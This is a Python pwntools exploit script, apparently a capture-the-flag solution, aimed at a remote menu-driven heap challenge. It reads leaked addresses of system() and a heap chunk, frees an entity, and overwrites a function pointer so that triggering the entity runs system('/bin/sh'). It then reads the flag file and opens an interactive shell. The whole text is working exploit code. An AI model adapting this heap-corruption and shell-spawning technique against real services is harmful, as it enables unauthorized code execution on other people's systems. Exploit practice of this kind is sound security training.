#!/usr/bin/env python3

from pwn import *

# r = process("./share/chal")
r = remote("10.113.184.121", 10057)


def send_with_pad(payload, length):
    r.send(payload + b"\x00" * (length - len(payload)))


def register_entity(idx):
    r.recvuntil(b"choice: ")
    send_with_pad(b"1", 0x1F)

    r.recvuntil(b"Index: ")
    send_with_pad(str(idx).encode(), 0x1F)


def delete_entity(idx):
    r.recvuntil(b"choice: ")
    send_with_pad(b"2", 0x1F)

    r.recvuntil(b"Index: ")
    send_with_pad(str(idx).encode(), 0x1F)


def set_name(idx, name):
    r.recvuntil(b"choice: ")
    send_with_pad(b"3", 0x1F)

    r.recvuntil(b"Index: ")
    send_with_pad(str(idx).encode(), 0x1F)

    r.recvuntil(b"Nmae Length: ")
    send_with_pad(str(len(name)).encode(), 0x1F)

    r.recvuntil(b"Name: ")
    send_with_pad(name, len(name))


def trigger_event(idx):
    r.recvuntil(b"choice: ")
    send_with_pad(b"4", 0x1F)

    r.recvuntil(b"Index: ")
    send_with_pad(str(idx).encode(), 0x1F)


r.recvuntil(b"gift1: ")
system_addr = r.recvline().strip()
system_addr = int(system_addr, 16)

r.recvuntil(b"gift2: ")
chunk_addr = r.recvline().strip()
chunk_addr = int(chunk_addr, 16) - 0x10

print("system_addr: " + hex(system_addr))
print("chunk_addr: " + hex(chunk_addr))

# r.interactive()

register_entity(0)
register_entity(1)
delete_entity(1)

payload = b""
payload += b"\x00" * 8
payload += p64(chunk_addr + 0x70)
payload += p64(system_addr)

print(b"payload: " + payload)
print("payload len: " + str(len(payload)))

set_name(0, payload)
set_name(1, b"/bin/sh\x00")
trigger_event(1)

r.sendline(b"cat /home/chal/flag.txt")
flag = r.recvline()

print(b"flag: " + flag)

r.interactive()
